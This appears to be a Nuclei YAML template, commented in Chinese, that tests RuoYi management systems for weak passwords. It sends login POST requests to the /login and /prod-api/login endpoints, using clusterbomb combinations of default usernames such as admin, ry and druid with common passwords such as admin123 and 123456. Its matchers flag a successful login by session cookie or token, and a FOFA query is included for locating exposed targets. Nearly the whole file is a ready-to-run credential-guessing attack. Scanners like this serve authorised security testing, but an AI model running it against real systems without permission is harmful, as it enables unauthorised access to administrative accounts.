id: ruoyi-weak-password

info:
  name: 若依管理系统弱口令检测
  author: yourname
  severity: high
  description: 检测若依系统（包括传统版和前后端分离版）是否存在弱口令漏洞
  metadata:
    fofa-query: app="若依-RuoYi"
  tags: ruoyi,weakpass,auth

requests:
  # 传统登录接口检测
  - raw:
      - |
        POST /login?redirect=%2Findex HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/login?redirect=%2Findex
        
        username={{username}}&password={{password}}&code=&rememberMe=true

    attack: clusterbomb
    payloads:
      username:
        - "admin"
        - "ry"
        - "ruoyi"
        - "druid"
      password:
        - "123456"
        - "admin"
        - "admin@123"
        - "admin123"
        - "admin888"
        - "druid"
      
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 302'
          - 'contains(header, "Location: /index")'
          - 'contains(header, "Set-Cookie: JSESSIONID=")'
        condition: and

  # 前后端分离版常用的prod-api接口检测
  - raw:
      - |
        POST /prod-api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/
        
        {"username":"{{username}}","password":"{{password}}","code":"","rememberMe":true}

    attack: clusterbomb
    payloads:
      username:
        - "admin"
        - "ry"
        - "ruoyi"
        - "druid"
      password:
        - "123456"
        - "admin"
        - "admin@123"
        - "admin123"
        - "admin888"
        - "druid"
      
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "\"code\":200")'
          - 'contains(body, "\"token\":")'
        condition: and
